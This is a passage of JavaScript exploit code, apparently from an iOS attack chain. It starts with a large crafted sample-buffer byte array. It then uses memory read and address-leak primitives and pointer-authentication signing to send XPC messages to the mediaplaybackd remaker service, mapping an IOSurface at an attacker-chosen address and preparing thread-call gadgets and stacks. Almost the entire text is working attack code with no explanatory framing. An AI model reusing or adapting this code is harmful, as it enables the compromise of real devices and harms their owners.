0x74, 0x5e, 0x5a, 0x1, 0xae, 0xa4, 0xb2, 0x7, 0x17, 0x0, 0xac, 0xa0, 0x21, 0xf0, 0xdf, 0x26, 0x24, 0x16, 0x80, 0xaf, 0x1, 0x8d, 0x8b, 0x90, 0x83, 0x13, 0x61, 0x1c, 0x35, 0x6d, 0x5c, 0xcc, 0xf9, 0x45, 0xc8, 0xdd, 0xf, 0x74, 0xb2, 0x82, 0x7a, 0xf6, 0xda, 0x4b, 0xe, 0xa, 0x1, 0xda, 0x63, 0x27, 0xf0, 0x90, 0x3f, 0xa1, 0x4b, 0x41, 0x1d, 0x73, 0xa, 0xbf, 0x30, 0x88, 0x23, 0x97, 0x53, 0x9f, 0x55, 0xf6, 0x15, 0x58, 0x2a, 0x26, 0x4c, 0x74, 0xb, 0xe7, 0x95, 0xc6, 0x64, 0x4a, 0x6e, 0xd1, 0xf0, 0x53, 0x26, 0x61, 0xac, 0x47, 0x73, 0x38, 0x30, 0x5e, 0x62, 0xc0, 0xe3, 0x3, 0x0, 0x7a, 0x7a, 0xb7, 0xb8, 0xa7, 0xae, 0xd2, 0xf4, 0x6, 0x90, 0x7, 0x81, 0xd0, 0xe2, 0xa4, 0x7d, 0xdd, 0x7f, 0x94, 0x82, 0xac, 0xb, 0x43, 0xff, 0x67, 0xff, 0xc7, 0xa5, 0xf1, 0x28, 0x5a, 0x58, 0xd0, 0xcc, 0x16, 0xec, 0xc1, 0x1e, 0xc2, 0x37, 0x5b, 0xe5, 0xa2, 0x6c, 0xfe, 0x93, 0xb9, 0x70, 0x44, 0x71, 0xe9, 0x4c, 0x2f, 0xfb, 0x66, 0xe4, 0xae, 0x2a, 0x72, 0x39, 0xff, 0xc7, 0x1, 0xea, 0xa4, 0x69, 0x59, 0x43, 0x31, 0x1c, 0xbd, 0xa3, 0x8d, 0x5b, 0x9b, 0x55, 0x24, 0x64, 0xb1, 0x8a, 0x6f, 0x7f, 0x4d, 0x74, 0x9a, 0xc7, 0x5b, 0xf4, 0x85, 0x26, 0xb0, 0xc5, 0x3, 0x41, 0x43, 0x62, 0xc7, 0xae, 0x60, 0x9b, 0x32, 0xdf, 0xbf, 0xca, 0xf4, 0x44, 0xc6, 0xf, 0xff, 0x4, 0xe1, 0x39, 0x2b, 0x1, 0x10, 0x8b, 0xf1, 0xea, 0xb6, 0x3b, 0xfb, 0x2d, 0xa9, 0x1e, 0x7c, 0x5a, 0xdb, 0x63, 0x78, 0xa2, 0xd9, 0x97, 0x34, 0x92, 0x0, 0x5c, 0xdc, 0xdf, 0x18, 0x2d, 0x31, 0xb5, 0xb3, 0xe, 0x12, 0x82, 0x15, 0xe0, 0x95, 0x95, 0xcc, 0xe8, 0x54, 0x28, 0xdf, 0x6b, 0x69, 0x6e, 0x0, 0xc8, 0xb2, 0xf7, 0x4d, 0xea, 0xcb, 0x84, 0x20, 0x2b, 0x2c, 0xcc, 0x3f, 0x17, 0xfa, 0x7b, 0xc, 0xeb, 0xbf, 0x48, 0xd9, 0xf5, 0xb8, 0xd7, 0xa1, 0x96, 0x2e, 0x24, 0x7a, 0xda, 0x6, 0x29, 0xb6, 0x3d, 0xb9, 0xd1, 0xfc, 0x14, 0x7f, 0x6e, 0x87, 0xe3, 0x12, 0x48, 0x56, 0x39, 0x1c, 0x82, 0xf2, 0x88, 0x7f, 0xa5, 0xb3, 0x24, 0x33, 0x70, 0xc8, 0x1e, 0xe, 0x23, 0x89, 0x38, 0x38, 0x74, 0xc9, 0x60, 0xfe, 0x24, 0x55, 0xf6, 0x9, 0x0, 0x0, 0x0, 0x64, 0x73, 0x6f, 0x69, 0x0, 0x50, 0x0, 0x0, 0x0, 0x61, 0x69, 0x74, 0x73, 0xd, 0x4f, 0x38, 0x5, 0x0, 0x0, 0x0, 0x0, 0x8d, 0x30, 0x49, 0xe8, 0x1, 0x0, 0x0, 0x0, 0x45, 0x79, 0x9e, 0x79, 0x0, 0x0, 0x0, 0x0, 0x37, 0x88, 0xb7, 0xf, 0x0, 0x0, 0x0, 0x0, 0x5f, 0x4c, 0x6d, 0xb, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x8f, 0x98, 0x9, 0x0, 0x0, 0x0, 0x0, 0xbc, 0xc3, 0xc3, 0x70, 0x0, 0x0, 0x0, 0x0, 0x40, 0xbb, 0x73, 0x2e, 0x1, 0x0, 0x0, 0x0, 0x80, 0x2, 0x4d, 0x17, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0xa2, 0x55, 0x81, 0xef, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x47, 0x8a, 0x5, 0xc2, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x86, 0x72, 0xed, 0x67, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x73, 0x60, 0xd5, 0xf, 0x9b, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0x3f, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0x81, 0x97, 0x8c, 0xcb, 0x2a, 0x6, 0xff, 0x69, 0xce, 0xa9, 0x10, 0xf0, 0x3d, 0x55, 0x7f, 0xf0, 0x4a, 0x6f, 0x3a, 0xb4, 0x9d, 0xd3, 0xe1, 0x55, 0xe9, 0x8, 0x3f, 0x91, 0x10, 0x5d, 0x65, 0xd0, 0x32, 0x1f, 0x90, 0xe9, 0xde, 0xb5, 0x79, 0xd3, 0x35, 0x20, 0xdf, 0xbe, 0xdf, 0x73, 0x7f, 0x4b, 0x1, 0xfe, 0x9a, 0xb5, 0xfd, 0x2a, 0x68, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x64, 0x88, 0x49, 0x89, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xde, 0xc2, 0xf2, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x3e, 0xc0, 0x1, 0xca, 0x51, 0xa, 0xba, 0x88, 0x4b, 0x83, 0x90, 0xee, 0x6e, 0x8b, 0xd1, 0x33, 0x14, 0x15, 0x78, 0x3f, 0xe4, 0xf6, 0xaa, 0xab, 0x56, 0x4e, 0x2b, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xd4, 0x8d, 0x8a, 0x99, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x9d, 0x5f, 0x9f, 0x2a, 0x8, 0x1, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xa9, 0x78, 0xbd, 0xb0, 0x0, 0x0, 0x0, 0x0, 0x99, 0x58, 0x2, 0x8a, 0xd7, 0x6e, 0x43, 0x62, 0xd9, 0x7a, 0xc2, 0x1f, 0x40, 0x96, 0x3c, 0x7b, 0xdb, 0xf5, 0xaf, 0x18, 0x42, 0xc8, 0x37, 0x9, 0xda, 0x6e, 0x10, 0x8, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x61, 0x69, 0x64, 0x6d, 0x65, 0x64, 0x69, 0x76, 0xe, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0xb6, 0x6d, 0xe8, 0xc0, 0xf3, 0x69, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x4c, 0x79, 0xff, 0x16, 0x0, 0x0, 0x0, 0x0, 0x53, 0x6e, 0xbf, 0xd5, 0xa1, 0xbc, 0x2, 0x23, 0x1b, 0x26, 0x89, 0xf0, 0xb7, 0xe4, 0xa, 0xb1, 0x8e, 0xd5, 0x1a, 0x1a, 0x37, 0xe5, 0x0, 0x4, 0x75, 0xc8, 0xbf, 0x48, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0xf1, 0x40, 0x7b, 0x30, 0x91, 0xc6, 0x6f, 0x8, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x23, 0xd9, 0x2a, 0xa9, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0xc4, 0x3c, 0xe5, 0x70, 0x2e, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x5e, 0x27, 0x87, 0x5a, 0xd8, 0x83, 0xb2, 0xa4, 0x49, 0xe0, 0x4c, 0x42, 0x60, 0x66, 0xcd, 0xe2, 0x9, 0xc3, 0xb8, 0x3c, 0x1b, 0x9b, 0x7a, 0xa4, 0x84, 0xe5, 0x72, 0xe8, 0x75, 0xfe, 0x95, 0xe8, 0x10, 0x80, 0xff, 0xcd, 0x27, 0x9d, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x1f, 0xf2, 0x4b, 0xea, 0x0, 0x0, 0x0, 0x0, 0xc9, 0x4f, 0x84, 0x27, 0xfe, 0xff, 0xff, 0xff, 0x52, 0xfe, 0xbf, 0xb6, 0x78, 0x26, 0x31, 0x3e, 0x79, 0x5c, 0x50, 0xbe, 0x33, 0xd1, 0x8f, 0x35, 0xc2, 0x4d, 0xab, 0xf9, 0x0, 0x0, 0x0, 0x0, 0x44, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xea, 0x39, 0x7e, 0xed, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x1d, 0xa1, 0x89, 0x83, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0x7c, 0x94, 0x1f, 0x5, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x70, 0x63, 0x6c, 0x63, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xbb, 0x5e, 0xcf, 0x11, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x53, 0xe, 0xe6, 0xf, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0xfa, 0xa0, 0x8d, 0x80, 0xc5, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x94, 0x5a, 0xa3, 0x7d, 0x33, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x5c, 0xb, 0x95, 0x31, 0x4b, 0x6b, 0x98, 0xb9, 0xf0, 0x22, 0xba, 0xc0, 0x13, 0x87, 0x4c, 0xa7, 0x2a, 0x7c, 0xd9, 0x64, 0xf0, 0x94, 0xaa, 0x16, 0x97, 0x81, 0xed, 0xb2, 0x14, 0xf0, 0xff, 0xb5, 0x13, 0x73, 0x80, 0xcd, 0x5f, 0x4, 0x8f, 0x62, 0x6, 0xc5, 0xca, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0x2d, 0x89, 0x78, 0x57, 0xad, 0x51, 0x91, 0x14, 0xc, 0x0, 0x0, 0x0, 0x67, 0x66, 0x63, 0x74, 0xae, 0xdc, 0x39, 0xbe, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x74, 0x63, 0x69, 0x70, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x66, 0xbf, 0xc0, 0xfc, 0x3e, 0x0, 0x0, 0x0, 0x69, 0x6b, 0x75, 0x63, 0x1d, 0x2d, 0x81, 0xbd, 0x24, 0xa5, 0x40, 0xf8, 0x9f, 0x84, 0xfb, 0x77, 0x71, 0x1f, 0x1, 0x4c, 0x4b, 0xa0, 0xdd, 0x58, 0x5, 0x0, 0xd8, 0x45, 0xde, 0xf9, 0xae, 0x16, 0x1, 0x70, 0x33, 0x49, 0xe6, 0xf1, 0xcb, 0x31, 0xa9, 0xfb, 0xa1, 0x0, 0xb8, 0xe5, 0x0, 0x81, 0x2e, 0x48, 0x61, 0xa2, 0xe1, 0xc9, 0x5, 0x74, 0xfe, 0xc5, 0xc, 0x0, 0x0, 0x0, 0x61, 0x69, 0x64, 0x6d, 0x61, 0x74, 0x65, 0x6d, 0xc, 0x0, 0x0, 0x0, 0x70, 0x6d, 0x73, 0x6e, 0x72, 0x26, 0xed, 0x7b, 0x5c, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x76, 0x78, 0x75, 0x61, 0xc, 0x0, 0x0, 0x0, 0x6e, 0x61, 0x75, 0x71, 0xe2, 0x8d, 0x1b, 0x53, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x65, 0x64, 0x69, 0x76, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x93, 0xc4, 0xbc, 0x48, 0x0, 0x0, 0x0, 0x0, 0x55, 0xb8, 0xec, 0x1a, 0x49, 0xb6, 0x7e, 0x70, 0xc2, 0x85, 0xdc, 0xa6, 0x95, 0xd4, 0xaf, 0x9d, 0xcd, 0xfc, 0x8b, 0x3f, 0xd4, 0xf9, 0x28, 0x5e, 0x2b, 0x97, 0xd4, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xb3, 0x0, 0x0, 0x0, 0x63, 0x73, 0x63, 0x66, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0x68, 0x89, 0x8, 0xe1, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0xb2, 0x32, 0xc6, 0xed, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x5f, 0xcb, 0x69, 0x3b, 0x26, 0xfd, 0x6b, 0x49, 0x83, 0xa8, 0x18, 0x8c, 0x96, 0xa5, 0xa, 0x86, 0xc5, 0x19, 0x78, 0xa3, 0x9f, 0x89, 0x6f, 0x6b, 0x30, 0xc1, 0xa4, 0x0, 0x0, 0x0, 0x0, 0xc, 0x0, 0x0, 0x0, 0x63, 0x64, 0x6f, 0x63, 0xac, 0x3b, 0xbf, 0xdd, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x6e, 0x75, 0x6f, 0x73, 0xc, 0x0, 0x0, 0x0, 0x62, 0x75, 0x73, 0x6d, 0x65, 0x64, 0x69, 0x76, 0x30, 0x0, 0x0, 0x0, 0x64, 0x62, 0x73, 0x61, 0x20, 0x79, 0x3c, 0x20, 0x0, 0x0, 0x0, 0x0, 0xfd, 0xa2, 0x8a, 0xf9, 0xd0, 0xf4, 0x9b, 0xef, 0x81, 0xab, 0xae, 0xba, 0x88, 0xeb, 0xc7, 0x9c, 0x3e, 0xf1, 0x3f, 0x52, 0x22, 0xaa, 0xb9, 0x2, 0x2a, 0x9d, 0xae, 0xb4, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x6d, 0x69, 0x64, 0x76, 0x11, 0x14, 0xab, 0xb7, 0xe7, 0x4, 0x9d, 0x47, 0xb, 0x0, 0x0, 0x0, 0x6c, 0x6e, 0x68, 0x63, 0x81, 0xb5, 0x49]);
  let sample_buffer_data_ptr = wc_uread64(addrof(sample_buffer_data) + 0x10n);
  let sample_buffer_data_size = BigInt(sample_buffer_data.length);
  if (integrated) {
    sample_buffer_data_ptr = gpuCopyBuffer(sample_buffer_data_ptr, sample_buffer_data_size);
  }
  LOG(`sample_buffer_data_ptr: ${sample_buffer_data_ptr.hex()}`);
  LOG(`sample_buffer_data_size: ${sample_buffer_data_size.hex()}`);
  let XPC_MESSAGE_VALUE_OPCODE_SERVER_HANDLE_SET_TIMEOUT = 0x12E746F21n;
  let XPC_MESSAGE_VALUE_OPCODE_SERVER_DISASSOCIATE_OBJECT_WITH_CONNECTION = 0x12E6E6370n;
  let XPC_MESSAGE_VALUE_OPCODE_ASSET_CREATE_WITH_BLOCKBUFFER = 0x63724242n;
  let XPC_MESSAGE_VALUE_OPCODE_ASSET_LOAD_VALUE_ASYNC_FOR_PROPERTY = 0x6C6F6431n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_CREATE_WITH_ASSET = 0x6D727461n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_ADD_AUDIO_TRACK_WITH_PRESET = 0x6D726170n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_ADD_VIDEOCOMPOSITION_TRACK = 0x6D617663n;
  let XPC_MESSAGE_VALUE_OPCODE_REMAKER_START_OUTPUT = 0x6D72736Fn;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_URL = 0x77727775n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_NATIVE_TRACK = 0x77616E74n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_BEGIN_SESSION = 0x77726273n;
  let XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_SAMPLE_BUFFER = 0x77726173n;
  let XPC_MESSAGE_KEY_OPCODE = ".Operation";
  let XPC_MESSAGE_KEY_OBJECT_ID = ".objectID";
  let XPC_MESSAGE_KEY_TRACK_ID_OUT = "TrackIDOut";
  let XPC_MESSAGE_KEY_ERROR_RETURN = ".ErrorReturn";
  let XPC_MESSAGE_KEY_BB_DATA = "BlockBufferData";
  let XPC_MESSAGE_KEY_FORMAT_IDENTIFIER_TYPE = "FormatIdentifierType";
  let XPC_MESSAGE_KEY_FORMAT_IDENTIFIER = "FormatIdentifier";
  let XPC_MESSAGE_KEY_PROPERTY_NAME = ".PropertyName";
  let XPC_MESSAGE_KEY_ASSET_TOKEN = "AssetToken";
  let XPC_MESSAGE_KEY_DEST_URL = "DestURL";
  let XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_DEST_URL = "SandboxRegistrationForDestURL";
  let XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_TEMP_DIR_URL = "SandboxRegistrationForTempDirURL";
  let XPC_MESSAGE_KEY_FORMAT_WRITER_OPTIONS = "FormatWriterOptions";
  let XPC_MESSAGE_KEY_REMAKER_OPTIONS = "RemakerOptions";
  let XPC_MESSAGE_KEY_MEDIA_TYPE = "MediaType";
  let XPC_MESSAGE_KEY_TIME = "Time";
  let XPC_MESSAGE_KEY_IOSURFACE = "IOSurface";
  let XPC_MESSAGE_KEY_SAMPLE_BUFFER = "SampleBuffer";
  let XPC_MESSAGE_KEY_TRACK_ID = "TrackID";
  let XPC_MESSAGE_KEY_AUDIO_PRESET_NAME = "AudioPresetName";
  let XPC_MESSAGE_KEY_AUDIO_PROCESSING_OPTIONS = "AudioProcessingOptions";
  function writer_add_sample_buffer_payload(writer, track, surface) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_SAMPLE_BUFFER);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let track_id = xpc_int64_create(track.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_TRACK_ID, track_id);
    xpc_release(track_id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_IOSURFACE, surface);
    xpc_release(surface);
    let bb_data = xpc_data_create(sample_buffer_data_ptr, sample_buffer_data_size);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_SAMPLE_BUFFER, bb_data);
    xpc_release(bb_data);
    return payload;
  }
  function writer_add_sample_buffer(connection, writer, track, surface) {
    let payload = writer_add_sample_buffer_payload(writer, track, surface);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    let er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      return er;
    }
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function create_bundle(path) {
    if (typeof path === "string") {
      path = get_cstring(path);
    }
    let bundle = xpc_dictionary_create_empty();
    let uuid = xpc_uuid_create(new Uint8Array([0xC3, 0x85, 0x3D, 0xCC, 0x97, 0x76, 0x41, 0x14, 0xB6, 0xC1, 0xFD, 0x9F, 0x51, 0x94, 0x4A, 0x6D]));
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.magic", uuid);
    xpc_release(uuid);
    let path_string = xpc_string_create(path);
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.string", path_string);
    xpc_release(path_string);
    xpc_dictionary_set_value(bundle, "com.apple.CFURL.base", xpc_null_create());
    return bundle;
  }
  function writer_create_with_url_payload(writer_path) {
    if (writer_path && typeof writer_path === "string") {
      writer_path = get_cstring(writer_path);
    }
    let payload = xpc_dictionary_create_empty();
    let XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_FRAGMENTED_DATA = 0x77776664n;
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_CREATE_WITH_FRAGMENTED_DATA);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let format_writer_options = xpc_dictionary_create_empty();
    xpc_dictionary_set_value(format_writer_options, "FileFormat", xpc_string_create("3GPFamily"));
    let remaker_options = xpc_dictionary_create_empty();
    xpc_dictionary_set_value(remaker_options, "AssetWriter_FastStart", xpc_bool_create(1n));
    let tmp_bundle = create_bundle("/tmp");
    xpc_dictionary_set_value(remaker_options, "Remaker_TemporaryDirectoryURL", tmp_bundle);
    xpc_release(tmp_bundle);
    let str = xpc_string_create("xxx");
    xpc_dictionary_set_value(remaker_options, "Remaker_InterimAssetName", str);
    xpc_release(str);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_FORMAT_WRITER_OPTIONS, format_writer_options);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_REMAKER_OPTIONS, remaker_options);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_SANDBOX_REGISTRATION_FOR_DEST_URL, xpc_uint64_create(2n));
    return payload;
  }
  function writer_create_with_url(connection, writer, writer_path) {
    let payload = writer_create_with_url_payload(writer_path);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      LOG(`[!] writer_create_with_url failed: ${er.hex()}`);
      return er;
    }
    let id = xpc_dictionary_get_uint64(reply, XPC_MESSAGE_KEY_OBJECT_ID);
    writer.id = id;
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function writer_add_native_track_payload(writer, media_type) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_ADD_NATIVE_TRACK);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let xpc_media_type = xpc_int64_create(media_type);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_MEDIA_TYPE, xpc_media_type);
    xpc_release(xpc_media_type);
    return payload;
  }
  function writer_add_native_track(connection, writer, media_type, track) {
    let payload = writer_add_native_track_payload(writer, media_type);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      LOG(`[!] writer_add_native_track failed: ${er.hex()}`);
      return er;
    }
    let id = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_TRACK_ID_OUT);
    track.id = id;
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function surface_create_with_address(address, size) {
    let dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let cf_number = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(size));
    res = CFDictionarySetValue(dict, kIOSurfaceAllocSize, cf_number);
    let surface_width_height = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0x10n));
    let surface_element_width = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0xFFn));
    let surface_pixel = CFNumberCreate(kCFAllocatorDefault, 9n, new_uint64_t(0x68646973n));
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, new_uint64_t(address));
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceWidth")), surface_width_height);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceHeight")), surface_width_height);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfaceElementWidth")), surface_element_width);
    res = CFDictionarySetValue(dict, create_cfstring(get_cstring("IOSurfacePixelFormat")), surface_pixel);
    let surface = IOSurfaceCreate(dict);
    CFRelease(dict);
    if (surface == 0n) {
      LOG("[!] Failed to create surface!!!");
      exit(0n);
    }
    return surface;
  }
  function writer_begin_session_payload(writer, time) {
    let payload = xpc_dictionary_create_empty();
    let operation = xpc_uint64_create(XPC_MESSAGE_VALUE_OPCODE_WRITER_BEGIN_SESSION);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OPCODE, operation);
    xpc_release(operation);
    let writer_id = xpc_uint64_create(writer.id);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_OBJECT_ID, writer_id);
    xpc_release(writer_id);
    let time_buffer_size = BigInt(time.length);
    let time_buffer_ptr = wc_uread64(addrof(time) + 0x10n);
    if (integrated) {
      time_buffer_ptr = gpuCopyBuffer(time_buffer_ptr, time_buffer_size);
    }
    let time_data = xpc_data_create(time_buffer_ptr, time_buffer_size);
    xpc_dictionary_set_value(payload, XPC_MESSAGE_KEY_TIME, time_data);
    xpc_release(time_data);
    return payload;
  }
  function writer_begin_session(connection, writer, time) {
    let payload = writer_begin_session_payload(writer, time);
    let reply = xpc_connection_send_message_with_reply_sync(connection, payload);
    let er = xpc_dictionary_get_int64(reply, XPC_MESSAGE_KEY_ERROR_RETURN);
    if (er != 0n) {
      return er;
    }
    xpc_release(payload);
    xpc_release(reply);
    return 0n;
  }
  function create_iosurface(surface_size) {
    let surface_address_ptr = new_uint64_t(0n);
    kr = mach_vm_allocate(mach_task_self(), surface_address_ptr, surface_size, VM_FLAGS_ANYWHERE);
    if (kr != 0n) {
      LOG("[!] error: failed to allocate surface mapping!");
      return kr;
    }
    surface_address = uread64(surface_address_ptr);
    LOG(`surface_address: ${surface_address.hex()}`);
    LOG(`surface_size: ${surface_size.hex()}`);
    let surface = surface_create_with_address(surface_address, surface_size);
    return surface;
  }

  let remaker_connection = null;

  function map_iosurface(surface) {
    let writer = {};
    let surface_address = 0n;
    let surface_port = 0n;
    let surface_id = 0n;
    let surface_track_id = 0n;
    let XPC_ENDPOINT_REMAKER = "com.apple.coremedia.mediaplaybackd.remaker.xpc";
    let event_handler_block = get_event_handler_block();
    remaker_connection = xpc_connection_create_mach_service(XPC_ENDPOINT_REMAKER, 0n, 0n);
    xpc_connection_set_event_handler(remaker_connection, event_handler_block);
    xpc_connection_activate(remaker_connection);
    surface_id = IOSurfaceGetID(surface);
    surface_port = IOSurfaceCreateXPCObject(surface);
    LOG(`surface_id: ${surface_id.hex()}`);
    LOG(`surface_port: ${surface_port.hex()}`);
    er = writer_create_with_url(remaker_connection, writer, "writer1.mov");
    assert(er == 0n, "writer creation failed");
    surface_track_id = {};
    er = writer_add_native_track(remaker_connection, writer, 0x76696465n, surface_track_id);
    assert(er == 0n, "writer creation failed");
    let begin_session_time = new Uint8Array([0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    er = writer_begin_session(remaker_connection, writer, begin_session_time);
    assert(er == 0n, "writer begin session failed");
    er = writer_add_sample_buffer(remaker_connection, writer, surface_track_id, surface_port);
    assert(er == 0n, `writer add sample buffer failed: ${er.hex()}`);
    return {
      "surface_address": surface_address,
      "surface_id": surface_id
    };
  }
  const tcall_DG_call_context = 0x0F45n;
  const tcall_DG_return_context = 0x48D8n;
  function tcall_create_thread(attr) {
    let tcall_thread_ptr = new_uint64_t();
    let ret = pthread_create(tcall_thread_ptr, attr, pacia(tcall_RLG, 0n), pacia(tcall_CRLG, 0n));
    assert(ret == 0n);
    return uread64(tcall_thread_ptr);
  }
  function tcall_create_stack(stack_size) {
    let ret = 0n;
    let total_stack_size = stack_size + 2n * 0x4000n;
    let thread_stack = mmap(0n, total_stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n, 0n);
    if (thread_stack == -1n) {
      return undefined;
    }
    let guard_page_left = thread_stack;
    let guard_page_right = thread_stack + total_stack_size - 0x4000n;
    ret = mprotect(guard_page_left, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    ret = mprotect(guard_page_right, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    let stack = {};
